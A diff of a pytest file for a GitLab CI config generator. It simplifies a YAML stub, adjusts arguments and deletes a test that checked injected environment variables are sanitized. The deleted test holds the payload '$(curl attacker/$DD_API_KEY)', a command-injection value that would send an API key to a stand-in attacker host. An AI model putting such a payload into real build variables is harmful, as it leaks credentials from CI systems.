@@ -16,23 +16,10 @@ _SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gi
 
 @pytest.fixture(scope="module")
 def gen_gitlab_config_mod():
-    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
-    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
-    # sys.path afterwards so the rest of the suite is unaffected.
+    # The script parses argv and imports the generator-only ruamel dependency at import time.
     ruamel = types.ModuleType("ruamel")
     yaml = types.ModuleType("ruamel.yaml")
-
-    class YAML:
-        def __enter__(self):
-            return self
-
-        def __exit__(self, *_args):
-            return None
-
-        def load(self, content):
-            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}
-
-    yaml.YAML = YAML
+    yaml.YAML = object
     ruamel.yaml = yaml
 
     spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
@@ -98,7 +85,6 @@ def test_parallelism_defaults_to_one_job(gen_gitlab_config_mod):
 def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
     info = gen_gitlab_config_mod.SuiteVenvInfo(
         environment_hashes=("hash-with-path", "hash-without-path"),
-        python_versions={"3.12"},
         environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
         ddtest_metadata={
             "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
@@ -168,22 +154,6 @@ def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_m
     assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2
 
 
-def test_build_base_test_artifacts_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
-    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
-    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
-    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
-    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})
-
-    gen_gitlab_config_mod.gen_build_base_test_artifacts()
-
-    config = (tmp_path / "tests-gen.yml").read_text()
-    assert 'echo "NIGHTLY_BUILD: false"' in config
-    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
-    assert 'if [[ "false" == "true" ]]' in config
-    assert "$(curl" not in config
-    assert "$DD_API_KEY" not in config
-
-
 def test_jobs_use_declared_environments(gen_gitlab_config_mod):
     environment_hashes = ("first", "second", "third")
     config = str(
@@ -192,12 +162,12 @@ def test_jobs_use_declared_environments(gen_gitlab_config_mod):
             stage="core",
             suite="tracer",
             parallelism=2,
-            python_versions={"3.10", "3.11"},
             environment_hashes=environment_hashes,
         )
     )
 
     assert "  extends: .test_base" in config
+    assert "    - job: extract_test_artifacts" in config
     assert "    TEST_SUITE: tracer" in config
     configured_hashes = {
         environment_hash
